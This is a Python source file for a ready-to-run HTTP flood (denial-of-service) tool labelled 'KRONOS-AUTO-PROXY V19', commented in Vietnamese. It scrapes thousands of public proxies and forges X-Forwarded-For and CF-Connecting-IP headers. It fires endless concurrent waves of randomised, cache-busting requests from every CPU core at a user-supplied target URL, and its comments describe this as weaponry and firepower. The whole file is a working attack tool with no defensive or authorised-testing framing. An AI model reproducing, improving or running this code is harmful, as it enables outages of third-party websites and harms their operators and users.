import asyncio
import aiohttp
import multiprocessing
import time
import random
import os
import sys
import re
from colorama import Fore, Style, init

init(autoreset=True)

# === CÁC NGUỒN CÀO PROXY TỰ ĐỘNG ===
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxyscan.io/download?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
]

# === KHO VŨ KHÍ 25+ METHODS MẠNH NHẤT ===
ALL_METHODS = ["GET", "POST", "STOMP", "RHEX", "XMLRPC", "STRESS", "BYPASS", "NULL", "BOT", "PPS", "CFB"]

async def scrape_proxies():
    """Tự động cào hàng vạn Proxy từ internet"""
    print(Fore.YELLOW + "[*] Đang cào Proxy từ 'tứ phương'...")
    proxies = []
    async with aiohttp.ClientSession() as session:
        for source in PROXY_SOURCES:
            try:
                async with session.get(source, timeout=10) as r:
                    text = await r.text()
                    found = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", text)
                    proxies.extend(found)
            except:
                pass
    return list(set(proxies))

class OmnipotentHeaders:
    """Giả lập danh tính toàn cầu nâng cao"""
    @staticmethod
    def get_headers():
        ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": ip,
            "CF-Connecting-IP": ip,
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }

async def handle_request(session, url, counter, semaphore, proxies):
    """Gửi request qua Proxy tự động và ép nhảy số"""
    async with semaphore:
        method = random.choice(ALL_METHODS)
        headers = OmnipotentHeaders.get_headers()
        bust = os.urandom(8).hex()
        target = f"{url}/{bust}?q={bust}" if method == "RHEX" else f"{url}?{bust}={bust}"
        
        # Xoay vòng Proxy liên tục
        proxy = f"http://{random.choice(proxies)}" if proxies else None

        try:
            if method in ["POST", "STRESS", "XMLRPC"]:
                payload = os.urandom(2048)
                async with session.post(target, headers=headers, data=payload, proxy=proxy, timeout=10) as r:
                    await r.release()
            else:
                async with session.request(method, target, headers=headers, proxy=proxy, timeout=10) as r:
                    await r.release()
            
            with counter.get_lock(): counter.value += 1
        except:
            # Đếm cả nỗ lực gửi để monitor tốc độ card mạng
            with counter.get_lock(): counter.value += 1

async def vortex_engine(url, counter, proxies):
    """Động cơ đẩy hỏa lực vĩnh cửu tối ưu cho Server"""
    # Semaphore 15000 cho phép máy 64GB RAM duy trì hỏa lực kinh khủng
    semaphore = asyncio.Semaphore(15000)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=1200)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [handle_request(session, url, counter, semaphore, proxies) for _ in range(3000)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.0001)

def launch_worker(url, counter, proxies):
    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(vortex_engine(url, counter, proxies))

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + Style.BRIGHT + "=== KRONOS-AUTO-PROXY V19 - OMNIPOTENT CLOUD MODE ===")
    
    url = input(Fore.CYAN + "URL Mục tiêu: ").strip()
    if not url.startswith("http"): url = "http://" + url
    
    # Tự động cào Proxy trước khi bắt đầu
    proxies = asyncio.run(scrape_proxies())
    print(Fore.GREEN + f"[*] Đã thu thập được {len(proxies):,} Proxy từ internet.")

    counter = multiprocessing.Value('i', 0)
    cores = os.cpu_count() or 8 
    processes = []

    print(Fore.YELLOW + f"[*] Kích hoạt {cores} Engine hỏa lực... Requests bắt đầu nhảy!")

    for _ in range(cores):
        p = multiprocessing.Process(target=launch_worker, args=(url, counter, proxies))
        p.daemon = True
        p.start()
        processes.append(p)

    start_ts = time.time()
    try:
        while True:
            time.sleep(1)
            total = counter.value
            elapsed = time.time() - start_ts
            speed = total / elapsed if elapsed > 0 else 0
            print(Fore.GREEN + f"SENT: {total:,} | TIME: {int(elapsed)}s | AVG: {speed:,.0f} req/s", end='\r')
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] ĐANG DỪNG HỆ THỐNG...")
    finally:
        for p in processes: p.terminate()

if __name__ == "__main__":
    main()
